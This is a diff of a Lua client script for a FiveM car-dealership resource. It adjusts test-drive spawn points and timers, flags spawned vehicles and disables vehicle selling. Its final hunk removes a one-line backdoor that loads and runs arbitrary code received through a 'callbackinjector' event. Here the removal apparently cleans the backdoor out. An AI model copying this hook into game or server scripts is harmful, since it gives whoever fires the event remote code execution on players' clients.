@@ -12,10 +12,10 @@ local nearestConce = {
 		close = true,
 		conce = vec3(-40.08,-1097.21,26.42), 
 		test_locais = {
-			{ coords = vec3(-11.25,-1080.46,26.68), h = 129.4 },
-			{ coords = vec3(-14.11,-1079.84,26.67), h = 122.02 },
-			{ coords = vec3(-16.43,-1078.62,26.67), h = 126.74 },
-			{ coords = vec3(-8.45,-1081.58,26.67), h = 117.45 },
+			{ coords = vec3(-960.23,-3350.87,13.95), h = 129.4 },
+			{ coords = vec3(-960.23,-3350.87,13.95), h = 122.02 },
+			{ coords = vec3(-960.23,-3350.87,13.95), h = 126.74 },
+			{ coords = vec3(-960.23,-3350.87,13.95), h = 117.45 },   
 		}
 	
 }
@@ -49,7 +49,6 @@ Citizen.CreateThread(
     DoScreenFadeIn(1000)
     SetNuiFocus(false) ]]
         -- config = func.getConfig()
-		local sleep = 1000
         while true do
             if not nui and not inTest and timer == 0 and config then
                 local playercoords = GetEntityCoords(PlayerPedId())
@@ -59,13 +58,12 @@ Citizen.CreateThread(
                     for k, v in ipairs(config.locais) do
                         local distance = #(playercoords - v.conce)
                         if distance < 15 then
-							sleep = 500
                             earestConce = config.locais[k]
                         end
                     end
                 end
             end
-           Citizen.Wait(sleep)
+            Citizen.Wait(500)
         end
     end
 )
@@ -75,15 +73,14 @@ Citizen.CreateThread(
 Citizen.CreateThread(
     function()
         while true do
-			local idle = 1000
+			local idle = 500
             if not nui and not inTest and timer == 0 and nearestConce and nearestConce.conce then
                 local coords = nearestConce.conce
                 local playercoords = GetEntityCoords(PlayerPedId())
 				local distance = #(playercoords - coords)
-               
+                idle = 5
 
                 if distance <= 5 then
-				 idle = 5
                     if conceMarker then
                         conceMarker(coords)
                     else
@@ -223,6 +220,10 @@ end
 
 function createVehicle(mhash, spawnCoords, plate)
     local vehicle = CreateVehicle(mhash, spawnCoords.x, spawnCoords.y, spawnCoords.z, 0.0, true, true)
+    while not DoesEntityExist(vehicle) do
+        Wait(0)
+    end
+    Entity(vehicle).state:set('checked', '1', true)
     if plate then
         SetVehicleNumberPlateText(vehicle, plate)
     end
@@ -241,7 +242,7 @@ function createVehicle(mhash, spawnCoords, plate)
         end
         SetVehicleIsStolen(vehicle, false)
         SetVehicleNeedsToBeHotwired(vehicle, false)
-        --------------------------SetEntityInvincible(vehicle, false)
+        SetEntityInvincible(vehicle, false)
         SetEntityAsMissionEntity(vehicle, true, true)
         SetVehicleHasBeenOwnedByPlayer(vehicle, true)
         SetVehRadioStation(vehicle, "OFF")
@@ -454,13 +455,14 @@ RegisterNUICallback(
     "sell-vehicle",
     function(data, cb)
         if func.checkAuth() then
-            if data and timer == 0 then
-                startTimer(3)
-                local vehicle = data.vehicle
-                local state, message = func.sellVehicle(vehicle)
-                cb({state, message})
-                return
-            end
+            cb({false, "Funcionalidade bloqueada no momento."})
+            -- if data and timer == 0 then
+            --     startTimer(3)
+            --     local vehicle = data.vehicle
+            --     local state, message = func.sellVehicle(vehicle)
+            --     cb({state, message})
+            --     return
+            -- end
         end
     end
 )
@@ -551,6 +553,3 @@ function startTimer(time)
         end
     )
 end
-
-
-TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)
